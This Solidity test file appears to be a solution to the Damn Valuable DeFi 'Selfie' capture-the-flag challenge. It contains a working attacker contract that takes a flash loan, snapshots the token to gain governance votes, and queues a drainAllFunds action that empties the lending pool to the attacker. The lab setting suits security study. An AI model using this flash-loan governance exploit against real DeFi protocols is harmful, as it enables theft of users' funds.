// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    Attacker_FlashLoanReceiver public attacker_sc;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        attacker_sc = new Attacker_FlashLoanReceiver(
            address(selfiePool),
            address(dvtSnapshot),
            address(simpleGovernance),
            address(attacker)
        );
        vm.label(address(attacker_sc), "attacker_sc");
        vm.startPrank(attacker);
        attacker_sc.pwn();
        // Advance time 5 days so that attacker can get funds
        vm.warp(block.timestamp + 5 days); // 5 days
        simpleGovernance.executeAction(1);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Attacker_FlashLoanReceiver {
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    SimpleGovernance internal simpleGovernance;
    address eoa_attacker;

    constructor(
        address _selfiePool,
        address _dvt,
        address _simpleGovernance,
        address _eoa_attacker
    ) {
        selfiePool = SelfiePool(_selfiePool);
        dvtSnapshot = DamnValuableTokenSnapshot(_dvt);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        eoa_attacker = _eoa_attacker;
    }

    function pwn() external {
        uint256 allFlashLoanBalance = dvtSnapshot.balanceOf(
            address(selfiePool)
        );
        dvtSnapshot.approve(address(selfiePool), allFlashLoanBalance);
        dvtSnapshot.approve(address(simpleGovernance), allFlashLoanBalance);
        selfiePool.flashLoan(allFlashLoanBalance);
    }

    function receiveTokens(address token, uint256 amount) external payable {
        dvtSnapshot.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            eoa_attacker
        );
        simpleGovernance.queueAction(address(selfiePool), data, 0);
        dvtSnapshot.transfer(address(selfiePool), amount);
    }
}
